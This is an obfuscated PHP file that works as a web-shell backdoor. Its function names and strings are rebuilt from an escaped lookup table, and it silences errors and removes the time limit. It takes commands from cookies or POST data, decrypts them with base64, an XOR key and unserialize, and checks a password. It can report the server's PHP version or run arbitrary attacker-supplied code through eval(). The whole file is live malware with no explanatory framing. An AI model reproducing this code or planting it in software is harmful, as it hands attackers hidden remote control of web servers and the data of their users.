<?php ${"\x47\x4c\x4fB\x41\x4c\x53"}['tf81'] = "\x29\x2f\x4d\x7c\x73\x68\x27\x6f\x2b\x4b\x9\x5a\x3b\x65\x7d\x44\x57\x72\x33\x79\x38\x45\x67\x48\x50\x69\x32\x71\x74\x62\x7b\x2c\x6e\x23\x6d\x61\x28\x56\x24\x66\x78\x58\x4e\x40\x41\x2a\x76\x22\x5b\x2d\x54\x3f\x7e\x4a\x3e\x34\x63\x7a\x5f\x60\x75\x5c\xd\x31\x64\x51\x6b\x46\xa\x25\x4c\x5d\x30\x39\x26\x52\x77\x49\x6c\x70\x4f\x36\x6a\x59\x35\x5e\x3c\x53\x37\x3d\x20\x21\x55\x43\x42\x3a\x47\x2e";
$GLOBALS[$GLOBALS['tf81'][17].$GLOBALS['tf81'][13].$GLOBALS['tf81'][55].$GLOBALS['tf81'][81].$GLOBALS['tf81'][39].$GLOBALS['tf81'][84].$GLOBALS['tf81'][72]] = $GLOBALS['tf81'][56].$GLOBALS['tf81'][5].$GLOBALS['tf81'][17];
$GLOBALS[$GLOBALS['tf81'][82].$GLOBALS['tf81'][18].$GLOBALS['tf81'][35].$GLOBALS['tf81'][29]] = $GLOBALS['tf81'][7].$GLOBALS['tf81'][17].$GLOBALS['tf81'][64];
$GLOBALS[$GLOBALS['tf81'][29].$GLOBALS['tf81'][18].$GLOBALS['tf81'][26].$GLOBALS['tf81'][73].$GLOBALS['tf81'][88].$GLOBALS['tf81'][39]] = $GLOBALS['tf81'][4].$GLOBALS['tf81'][28].$GLOBALS['tf81'][17].$GLOBALS['tf81'][78].$GLOBALS['tf81'][13].$GLOBALS['tf81'][32];
$GLOBALS[$GLOBALS['tf81'][66].$GLOBALS['tf81'][72].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][63].$GLOBALS['tf81'][64].$GLOBALS['tf81'][26].$GLOBALS['tf81'][72]] = $GLOBALS['tf81'][25].$GLOBALS['tf81'][32].$GLOBALS['tf81'][25].$GLOBALS['tf81'][58].$GLOBALS['tf81'][4].$GLOBALS['tf81'][13].$GLOBALS['tf81'][28];
$GLOBALS[$GLOBALS['tf81'][82].$GLOBALS['tf81'][63].$GLOBALS['tf81'][84].$GLOBALS['tf81'][18].$GLOBALS['tf81'][13].$GLOBALS['tf81'][84].$GLOBALS['tf81'][55].$GLOBALS['tf81'][20]] = $GLOBALS['tf81'][4].$GLOBALS['tf81'][13].$GLOBALS['tf81'][17].$GLOBALS['tf81'][25].$GLOBALS['tf81'][35].$GLOBALS['tf81'][78].$GLOBALS['tf81'][25].$GLOBALS['tf81'][57].$GLOBALS['tf81'][13];
$GLOBALS[$GLOBALS['tf81'][60].$GLOBALS['tf81'][39].$GLOBALS['tf81'][88].$GLOBALS['tf81'][18].$GLOBALS['tf81'][84].$GLOBALS['tf81'][81].$GLOBALS['tf81'][63].$GLOBALS['tf81'][84].$GLOBALS['tf81'][63]] = $GLOBALS['tf81'][79].$GLOBALS['tf81'][5].$GLOBALS['tf81'][79].$GLOBALS['tf81'][46].$GLOBALS['tf81'][13].$GLOBALS['tf81'][17].$GLOBALS['tf81'][4].$GLOBALS['tf81'][25].$GLOBALS['tf81'][7].$GLOBALS['tf81'][32];
$GLOBALS[$GLOBALS['tf81'][56].$GLOBALS['tf81'][81].$GLOBALS['tf81'][73].$GLOBALS['tf81'][84].$GLOBALS['tf81'][29].$GLOBALS['tf81'][73].$GLOBALS['tf81'][73].$GLOBALS['tf81'][26]] = $GLOBALS['tf81'][60].$GLOBALS['tf81'][32].$GLOBALS['tf81'][4].$GLOBALS['tf81'][13].$GLOBALS['tf81'][17].$GLOBALS['tf81'][25].$GLOBALS['tf81'][35].$GLOBALS['tf81'][78].$GLOBALS['tf81'][25].$GLOBALS['tf81'][57].$GLOBALS['tf81'][13];
$GLOBALS[$GLOBALS['tf81'][22].$GLOBALS['tf81'][35].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][35]] = $GLOBALS['tf81'][29].$GLOBALS['tf81'][35].$GLOBALS['tf81'][4].$GLOBALS['tf81'][13].$GLOBALS['tf81'][81].$GLOBALS['tf81'][55].$GLOBALS['tf81'][58].$GLOBALS['tf81'][64].$GLOBALS['tf81'][13].$GLOBALS['tf81'][56].$GLOBALS['tf81'][7].$GLOBALS['tf81'][64].$GLOBALS['tf81'][13];
$GLOBALS[$GLOBALS['tf81'][19].$GLOBALS['tf81'][73].$GLOBALS['tf81'][64].$GLOBALS['tf81'][39].$GLOBALS['tf81'][81].$GLOBALS['tf81'][13].$GLOBALS['tf81'][35]] = $GLOBALS['tf81'][4].$GLOBALS['tf81'][13].$GLOBALS['tf81'][28].$GLOBALS['tf81'][58].$GLOBALS['tf81'][28].$GLOBALS['tf81'][25].$GLOBALS['tf81'][34].$GLOBALS['tf81'][13].$GLOBALS['tf81'][58].$GLOBALS['tf81'][78].$GLOBALS['tf81'][25].$GLOBALS['tf81'][34].$GLOBALS['tf81'][25].$GLOBALS['tf81'][28];
$GLOBALS[$GLOBALS['tf81'][39].$GLOBALS['tf81'][72].$GLOBALS['tf81'][55].$GLOBALS['tf81'][55]] = $GLOBALS['tf81'][40].$GLOBALS['tf81'][13].$GLOBALS['tf81'][81].$GLOBALS['tf81'][84];
$GLOBALS[$GLOBALS['tf81'][25].$GLOBALS['tf81'][20].$GLOBALS['tf81'][64].$GLOBALS['tf81'][39]] = $GLOBALS['tf81'][39].$GLOBALS['tf81'][35].$GLOBALS['tf81'][39].$GLOBALS['tf81'][56];
$GLOBALS[$GLOBALS['tf81'][28].$GLOBALS['tf81'][18].$GLOBALS['tf81'][63].$GLOBALS['tf81'][13].$GLOBALS['tf81'][29].$GLOBALS['tf81'][35].$GLOBALS['tf81'][26]] = $_POST;
$GLOBALS[$GLOBALS['tf81'][25].$GLOBALS['tf81'][20].$GLOBALS['tf81'][13].$GLOBALS['tf81'][81]] = $_COOKIE;
@$GLOBALS[$GLOBALS['tf81'][66].$GLOBALS['tf81'][72].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][63].$GLOBALS['tf81'][64].$GLOBALS['tf81'][26].$GLOBALS['tf81'][72]]($GLOBALS['tf81'][13].$GLOBALS['tf81'][17].$GLOBALS['tf81'][17].$GLOBALS['tf81'][7].$GLOBALS['tf81'][17].$GLOBALS['tf81'][58].$GLOBALS['tf81'][78].$GLOBALS['tf81'][7].$GLOBALS['tf81'][22], NULL);
@$GLOBALS[$GLOBALS['tf81'][66].$GLOBALS['tf81'][72].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][63].$GLOBALS['tf81'][64].$GLOBALS['tf81'][26].$GLOBALS['tf81'][72]]($GLOBALS['tf81'][78].$GLOBALS['tf81'][7].$GLOBALS['tf81'][22].$GLOBALS['tf81'][58].$GLOBALS['tf81'][13].$GLOBALS['tf81'][17].$GLOBALS['tf81'][17].$GLOBALS['tf81'][7].$GLOBALS['tf81'][17].$GLOBALS['tf81'][4], 0);
@$GLOBALS[$GLOBALS['tf81'][66].$GLOBALS['tf81'][72].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][63].$GLOBALS['tf81'][64].$GLOBALS['tf81'][26].$GLOBALS['tf81'][72]]($GLOBALS['tf81'][34].$GLOBALS['tf81'][35].$GLOBALS['tf81'][40].$GLOBALS['tf81'][58].$GLOBALS['tf81'][13].$GLOBALS['tf81'][40].$GLOBALS['tf81'][13].$GLOBALS['tf81'][56].$GLOBALS['tf81'][60].$GLOBALS['tf81'][28].$GLOBALS['tf81'][25].$GLOBALS['tf81'][7].$GLOBALS['tf81'][32].$GLOBALS['tf81'][58].$GLOBALS['tf81'][28].$GLOBALS['tf81'][25].$GLOBALS['tf81'][34].$GLOBALS['tf81'][13], 0);
@$GLOBALS[$GLOBALS['tf81'][19].$GLOBALS['tf81'][73].$GLOBALS['tf81'][64].$GLOBALS['tf81'][39].$GLOBALS['tf81'][81].$GLOBALS['tf81'][13].$GLOBALS['tf81'][35]](0);

$m7d8f3260 = NULL;
$aa24cc = NULL;

$GLOBALS[$GLOBALS['tf81'][7].$GLOBALS['tf81'][20].$GLOBALS['tf81'][56].$GLOBALS['tf81'][55].$GLOBALS['tf81'][55]] = $GLOBALS['tf81'][55].$GLOBALS['tf81'][84].$GLOBALS['tf81'][81].$GLOBALS['tf81'][35].$GLOBALS['tf81'][39].$GLOBALS['tf81'][81].$GLOBALS['tf81'][73].$GLOBALS['tf81'][81].$GLOBALS['tf81'][49].$GLOBALS['tf81'][29].$GLOBALS['tf81'][56].$GLOBALS['tf81'][39].$GLOBALS['tf81'][13].$GLOBALS['tf81'][49].$GLOBALS['tf81'][55].$GLOBALS['tf81'][55].$GLOBALS['tf81'][20].$GLOBALS['tf81'][26].$GLOBALS['tf81'][49].$GLOBALS['tf81'][73].$GLOBALS['tf81'][18].$GLOBALS['tf81'][26].$GLOBALS['tf81'][84].$GLOBALS['tf81'][49].$GLOBALS['tf81'][88].$GLOBALS['tf81'][35].$GLOBALS['tf81'][18].$GLOBALS['tf81'][20].$GLOBALS['tf81'][84].$GLOBALS['tf81'][20].$GLOBALS['tf81'][73].$GLOBALS['tf81'][72].$GLOBALS['tf81'][81].$GLOBALS['tf81'][55].$GLOBALS['tf81'][81].$GLOBALS['tf81'][29];
global $o8c44;

function fafc($m7d8f3260, $oc7a4)
{
    $p5bffbf = "";

    for ($i0aec=0; $i0aec<$GLOBALS[$GLOBALS['tf81'][29].$GLOBALS['tf81'][18].$GLOBALS['tf81'][26].$GLOBALS['tf81'][73].$GLOBALS['tf81'][88].$GLOBALS['tf81'][39]]($m7d8f3260);)
    {
        for ($nfd19=0; $nfd19<$GLOBALS[$GLOBALS['tf81'][29].$GLOBALS['tf81'][18].$GLOBALS['tf81'][26].$GLOBALS['tf81'][73].$GLOBALS['tf81'][88].$GLOBALS['tf81'][39]]($oc7a4) && $i0aec<$GLOBALS[$GLOBALS['tf81'][29].$GLOBALS['tf81'][18].$GLOBALS['tf81'][26].$GLOBALS['tf81'][73].$GLOBALS['tf81'][88].$GLOBALS['tf81'][39]]($m7d8f3260); $nfd19++, $i0aec++)
        {
            $p5bffbf .= $GLOBALS[$GLOBALS['tf81'][17].$GLOBALS['tf81'][13].$GLOBALS['tf81'][55].$GLOBALS['tf81'][81].$GLOBALS['tf81'][39].$GLOBALS['tf81'][84].$GLOBALS['tf81'][72]]($GLOBALS[$GLOBALS['tf81'][82].$GLOBALS['tf81'][18].$GLOBALS['tf81'][35].$GLOBALS['tf81'][29]]($m7d8f3260[$i0aec]) ^ $GLOBALS[$GLOBALS['tf81'][82].$GLOBALS['tf81'][18].$GLOBALS['tf81'][35].$GLOBALS['tf81'][29]]($oc7a4[$nfd19]));
        }
    }

    return $p5bffbf;
}

function xe65($m7d8f3260, $oc7a4)
{
    global $o8c44;

    return $GLOBALS[$GLOBALS['tf81'][25].$GLOBALS['tf81'][20].$GLOBALS['tf81'][64].$GLOBALS['tf81'][39]]($GLOBALS[$GLOBALS['tf81'][25].$GLOBALS['tf81'][20].$GLOBALS['tf81'][64].$GLOBALS['tf81'][39]]($m7d8f3260, $o8c44), $oc7a4);
}

foreach ($GLOBALS[$GLOBALS['tf81'][25].$GLOBALS['tf81'][20].$GLOBALS['tf81'][13].$GLOBALS['tf81'][81]] as $oc7a4=>$o679e0)
{
    $m7d8f3260 = $o679e0;
    $aa24cc = $oc7a4;
}

if (!$m7d8f3260)
{
    foreach ($GLOBALS[$GLOBALS['tf81'][28].$GLOBALS['tf81'][18].$GLOBALS['tf81'][63].$GLOBALS['tf81'][13].$GLOBALS['tf81'][29].$GLOBALS['tf81'][35].$GLOBALS['tf81'][26]] as $oc7a4=>$o679e0)
    {
        $m7d8f3260 = $o679e0;
        $aa24cc = $oc7a4;
    }
}

$m7d8f3260 = @$GLOBALS[$GLOBALS['tf81'][56].$GLOBALS['tf81'][81].$GLOBALS['tf81'][73].$GLOBALS['tf81'][84].$GLOBALS['tf81'][29].$GLOBALS['tf81'][73].$GLOBALS['tf81'][73].$GLOBALS['tf81'][26]]($GLOBALS[$GLOBALS['tf81'][39].$GLOBALS['tf81'][72].$GLOBALS['tf81'][55].$GLOBALS['tf81'][55]]($GLOBALS[$GLOBALS['tf81'][22].$GLOBALS['tf81'][35].$GLOBALS['tf81'][29].$GLOBALS['tf81'][26].$GLOBALS['tf81'][35]]($m7d8f3260), $aa24cc));
if (isset($m7d8f3260[$GLOBALS['tf81'][35].$GLOBALS['tf81'][66]]) && $o8c44==$m7d8f3260[$GLOBALS['tf81'][35].$GLOBALS['tf81'][66]])
{
    if ($m7d8f3260[$GLOBALS['tf81'][35]] == $GLOBALS['tf81'][25])
    {
        $i0aec = Array(
            $GLOBALS['tf81'][79].$GLOBALS['tf81'][46] => @$GLOBALS[$GLOBALS['tf81'][60].$GLOBALS['tf81'][39].$GLOBALS['tf81'][88].$GLOBALS['tf81'][18].$GLOBALS['tf81'][84].$GLOBALS['tf81'][81].$GLOBALS['tf81'][63].$GLOBALS['tf81'][84].$GLOBALS['tf81'][63]](),
            $GLOBALS['tf81'][4].$GLOBALS['tf81'][46] => $GLOBALS['tf81'][63].$GLOBALS['tf81'][97].$GLOBALS['tf81'][72].$GLOBALS['tf81'][49].$GLOBALS['tf81'][63],
        );
        echo @$GLOBALS[$GLOBALS['tf81'][82].$GLOBALS['tf81'][63].$GLOBALS['tf81'][84].$GLOBALS['tf81'][18].$GLOBALS['tf81'][13].$GLOBALS['tf81'][84].$GLOBALS['tf81'][55].$GLOBALS['tf81'][20]]($i0aec);
    }
    elseif ($m7d8f3260[$GLOBALS['tf81'][35]] == $GLOBALS['tf81'][13])
    {
        eval($m7d8f3260[$GLOBALS['tf81'][64]]);
    }
    exit();
}